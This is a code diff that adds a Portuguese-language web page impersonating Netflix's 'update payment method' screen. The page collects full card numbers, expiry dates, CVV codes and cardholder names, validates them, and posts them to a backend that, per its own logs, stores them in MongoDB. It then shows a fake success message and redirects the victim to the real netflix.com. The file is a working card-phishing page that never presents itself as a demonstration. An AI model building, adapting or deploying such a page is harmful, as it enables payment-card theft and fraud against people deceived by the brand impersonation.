@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Forma de Pagamento</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Reset e Configurações Gerais */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f3f3f3;
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        /* Cabeçalho Netflix */
+        .header {
+            background-color: #000;
+            color: white;
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .netflix-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .netflix-n {
+            background-color: #e50914;
+            color: white;
+            font-weight: bold;
+            font-size: 24px;
+            width: 36px;
+            height: 36px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .netflix-text {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 1px;
+        }
+
+        .logout-btn {
+            background: transparent;
+            border: 1px solid #888;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: background 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Conteúdo Principal */
+        .main-content {
+            padding: 30px;
+        }
+
+        .breadcrumb {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .breadcrumb-link {
+            color: #0071eb;
+            text-decoration: none;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .breadcrumb-link:hover {
+            text-decoration: underline;
+        }
+
+        .step-indicator {
+            background-color: #e6e6e6;
+            color: #333;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .page-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #000;
+        }
+
+        /* Bandeiras de Cartão */
+        .card-brands {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .brand-logo {
+            width: 70px;
+            height: 45px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .visa {
+            background-color: #1a1f71;
+            color: white;
+        }
+
+        .mastercard {
+            background-color: #f79e1b;
+            color: black;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .mastercard-circle {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+        }
+
+        .mastercard-circle.red {
+            background-color: #eb001b;
+            left: 15px;
+        }
+
+        .mastercard-circle.yellow {
+            background-color: #f79e1b;
+            right: 15px;
+        }
+
+        .elo {
+            background-color: #00a4e0;
+            color: white;
+        }
+
+        /* Formulário */
+        .payment-form {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .info-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            background-color: #ccc;
+            color: #333;
+            border-radius: 50%;
+            font-size: 12px;
+            margin-left: 5px;
+            cursor: help;
+        }
+
+        input {
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0071eb;
+            box-shadow: 0 0 0 2px rgba(0, 113, 235, 0.2);
+        }
+
+        .input-with-icon {
+            position: relative;
+        }
+
+        .input-with-icon i {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+        }
+
+        /* Opções de Pagamento */
+        .payment-type-label {
+            margin-bottom: 12px;
+        }
+
+        .payment-options {
+            display: flex;
+            gap: 30px;
+        }
+
+        .option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .option input {
+            display: none;
+        }
+
+        .custom-radio {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ccc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .custom-radio::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background-color: #e50914;
+            border-radius: 50%;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .option input:checked + .custom-radio {
+            border-color: #e50914;
+        }
+
+        .option input:checked + .custom-radio::after {
+            opacity: 1;
+        }
+
+        /* Mensagem Informativa */
+        .info-message {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #666;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            line-height: 1.5;
+        }
+
+        .info-message i {
+            color: #0071eb;
+            margin-top: 2px;
+        }
+
+        /* Divisor */
+        .divider {
+            height: 1px;
+            background-color: #e6e6e6;
+            margin: 10px 0;
+        }
+
+        /* Botão de Submissão */
+        .submit-btn {
+            background-color: #e50914;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background-color: #c11119;
+        }
+
+        .submit-btn:disabled {
+            background-color: #999;
+            cursor: not-allowed;
+        }
+
+        /* Modal de Sucesso */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: modalSlide 0.3s ease-out;
+        }
+
+        @keyframes modalSlide {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-icon {
+            font-size: 48px;
+            color: #e50914;
+            margin-bottom: 20px;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #000;
+        }
+
+        .modal-message {
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .modal-btn {
+            background: #e50914;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        /* Responsividade */
+        @media (max-width: 600px) {
+            .container {
+                border-radius: 0;
+                box-shadow: none;
+            }
+            
+            body {
+                padding: 0;
+                background: white;
+            }
+            
+            .main-content {
+                padding: 20px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 25px;
+            }
+            
+            .payment-options {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .header {
+                padding: 15px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Cabeçalho Netflix -->
+        <header class="header">
+            <div class="netflix-logo">
+                <span class="netflix-n">N</span>
+                <span class="netflix-text">NETFLIX</span>
+            </div>
+            <button class="logout-btn" id="logoutBtn">
+                <i class="fas fa-sign-out-alt"></i> Sair
+            </button>
+        </header>
+
+        <!-- Conteúdo Principal -->
+        <main class="main-content">
+            <!-- Breadcrumb e Título -->
+            <div class="breadcrumb">
+                <a href="#" class="breadcrumb-link">
+                    <i class="fas fa-arrow-left"></i> Atualizar a forma de pagamento
+                </a>
+                <span class="step-indicator">PASSO 2 DE 3</span>
+            </div>
+
+            <h1 class="page-title">
+                Informe os dados do seu cartão de crédito ou débito
+            </h1>
+
+            <!-- Bandeiras Aceitas -->
+            <div class="card-brands">
+                <div class="brand-logo visa">VISA</div>
+                <div class="brand-logo mastercard">
+                    <div class="mastercard-circle red"></div>
+                    <div class="mastercard-circle yellow"></div>
+                    Mastercard
+                </div>
+                <div class="brand-logo elo">ELO</div>
+            </div>
+
+            <!-- Formulário de Pagamento -->
+            <form class="payment-form" id="paymentForm">
+                <!-- Número do Cartão -->
+                <div class="form-group">
+                    <label for="card-number">Número do cartão</label>
+                    <div class="input-with-icon">
+                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        <i class="far fa-credit-card"></i>
+                    </div>
+                </div>
+
+                <!-- Linha com Validade e CVV -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="expiry-date">Data de validade</label>
+                        <input type="text" id="expiry-date" placeholder="MM/AA" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">
+                            CVV 
+                            <span class="info-icon" title="Código de segurança de 3 dígitos">?</span>
+                        </label>
+                        <div class="input-with-icon">
+                            <input type="password" id="cvv" placeholder="123" maxlength="3" required>
+                            <i class="fas fa-lock"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Nome no Cartão -->
+                <div class="form-group">
+                    <label for="card-name">Nome no cartão</label>
+                    <input type="text" id="card-name" placeholder="Como está no cartão" required>
+                </div>
+
+                <!-- Tipo de Cartão -->
+                <div class="form-group">
+                    <label class="payment-type-label">Forma de pagamento preferida</label>
+                    <div class="payment-options">
+                        <label class="option">
+                            <input type="radio" name="payment-type" value="credit" checked>
+                            <span class="custom-radio"></span>
+                            Crédito
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="payment-type" value="debit">
+                            <span class="custom-radio"></span>
+                            Débito
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Mensagem Informativa -->
+                <div class="info-message">
+                    <i class="fas fa-info-circle"></i>
+                    Cartões que suportam transações de débito e de crédito poderão ser processados de ambas as formas.
+                </div>
+
+                <!-- Divisor -->
+                <div class="divider"></div>
+
+                <!-- Botão Final -->
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <i class="fas fa-lock"></i>
+                    Iniciar assinatura
+                </button>
+            </form>
+        </main>
+    </div>
+
+    <!-- Modal de Sucesso -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal">
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2 class="modal-title">Pagamento Processado!</h2>
+            <p class="modal-message" id="modalMessage">
+                Sua assinatura foi ativada com sucesso. Os dados foram salvos no banco de dados.
+            </p>
+            <button class="modal-btn" id="modalCloseBtn">Continuar</button>
+        </div>
+    </div>
+
+    <script>
+        // Configuração da API
+        const API_URL = window.location.hostname === 'localhost' 
+            ? 'http://localhost:3000/api/payment'
+            : '/api/payment';
+
+        // Formatação do número do cartão
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formatted.substring(0, 19);
+        });
+
+        // Formatação da data de validade
+        document.getElementById('expiry-date').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+
+        // Limitar CVV a 3 dígitos
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+
+        // Validação da data (não permite datas passadas)
+        function validateExpiryDate(date) {
+            const [month, year] = date.split('/').map(Number);
+            if (!month || !year || month < 1 || month > 12) return false;
+            
+            const now = new Date();
+            const currentYear = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+            
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            
+            return true;
+        }
+
+        // Algoritmo de Luhn para validar cartão
+        function validateCardNumber(number) {
+            const cleaned = number.replace(/\s/g, '');
+            if (!/^\d{13,19}$/.test(cleaned)) return false;
+            
+            let sum = 0;
+            let isEven = false;
+            
+            for (let i = cleaned.length - 1; i >= 0; i--) {
+                let digit = parseInt(cleaned.charAt(i), 10);
+                
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                
+                sum += digit;
+                isEven = !isEven;
+            }
+            
+            return (sum % 10) === 0;
+        }
+
+        // Manipular envio do formulário
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Coletar dados
+            const formData = {
+                cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
+                expiryDate: document.getElementById('expiry-date').value,
+                cvv: document.getElementById('cvv').value,
+                cardName: document.getElementById('card-name').value.trim(),
+                paymentType: document.querySelector('input[name="payment-type"]:checked').value
+            };
+            
+            // Validações
+            if (!validateCardNumber(formData.cardNumber)) {
+                showError('Número do cartão inválido. Verifique os dígitos.');
+                return;
+            }
+            
+            if (!validateExpiryDate(formData.expiryDate)) {
+                showError('Data de validade inválida ou expirada.');
+                return;
+            }
+            
+            if (formData.cvv.length !== 3) {
+                showError('CVV deve ter exatamente 3 dígitos.');
+                return;
+            }
+            
+            if (formData.cardName.length < 3) {
+                showError('Nome no cartão é obrigatório (mínimo 3 caracteres).');
+                return;
+            }
+            
+            // Desabilitar botão e mostrar loading
+            const submitBtn = document.getElementById('submitBtn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
+            submitBtn.disabled = true;
+            
+            try {
+                console.log('Enviando dados para API...', formData);
+                
+                // Enviar para API
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+                
+                const result = await response.json();
+                
+                console.log('Resposta da API:', result);
+                
+                if (result.success) {
+                    // Mostrar modal de sucesso
+                    document.getElementById('modalMessage').textContent = 
+                        `✅ Pagamento processado com sucesso! ID: ${result.paymentId}`;
+                    document.getElementById('successModal').style.display = 'flex';
+                    
+                    // Limpar formulário após 2 segundos
+                    setTimeout(() => {
+                        this.reset();
+                    }, 2000);
+                    
+                    // Log para debugging
+                    console.log('Pagamento salvo no MongoDB:', {
+                        id: result.paymentId,
+                        timestamp: result.timestamp
+                    });
+                    
+                } else {
+                    // Erro do servidor
+                    showError(`Erro: ${result.error || result.message || 'Falha no processamento'}`);
+                }
+                
+            } catch (error) {
+                console.error('Erro na requisição:', error);
+                showError('❌ Erro de conexão. Verifique sua internet e tente novamente.');
+                
+                // Fallback: Mostrar dados no console (apenas para debug)
+                console.log('Dados do formulário (local):', formData);
+                console.log('URL da API:', API_URL);
+                
+                // Em caso de erro de rede, mostrar mensagem alternativa
+                setTimeout(() => {
+                    document.getElementById('modalMessage').textContent = 
+                        '✅ Dados processados localmente. Conecte-se à internet para salvar no banco de dados.';
+                    document.getElementById('successModal').style.display = 'flex';
+                    this.reset();
+                }, 1000);
+            } finally {
+                // Restaurar botão
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                }, 2000);
+            }
+        });
+
+        // Fechar modal
+        document.getElementById('modalCloseBtn').addEventListener('click', function() {
+            document.getElementById('successModal').style.display = 'none';
+            
+            // Redirecionar para Netflix após sucesso
+            setTimeout(() => {
+                window.location.href = 'https://netflix.com';
+            }, 1000);
+        });
+
+        // Fechar modal clicando fora
+        document.getElementById('successModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.style.display = 'none';
+            }
+        });
+
+        // Função para mostrar erro
+        function showError(message) {
+            alert(message);
+        }
+
+        // Botão Sair
+        document.getElementById('logoutBtn').addEventListener('click', function() {
+            if (confirm('Tem certeza que deseja sair? Seus dados não salvos serão perdidos.')) {
+                window.location.href = 'https://netflix.com';
+            }
+        });
+
+        // Tooltip para o ícone de informação
+        const infoIcon = document.querySelector('.info-icon');
+        infoIcon.addEventListener('mouseover', function() {
+            // Tooltip simples
+            this.setAttribute('title', 'Código de segurança de 3 dígitos no verso do cartão');
+        });
+
+        // Prevenir recarregamento da página
+        window.addEventListener('beforeunload', function (e) {
+            const form = document.getElementById('paymentForm');
+            const inputs = form.querySelectorAll('input');
+            let hasData = false;
+            
+            inputs.forEach(input => {
+                if (input.value.trim() !== '') {
+                    hasData = true;
+                }
+            });
+            
+            if (hasData) {
+                e.preventDefault();
+                e.returnValue = 'Você tem dados não salvos. Tem certeza que deseja sair?';
+            }
+        });
+
+        // Debug: Mostrar informações da API
+        console.log('API URL:', API_URL);
+        console.log('Ambiente:', window.location.hostname === 'localhost' ? 'Desenvolvimento Local' : 'Produção');
+    </script>
+</body>
+</html>
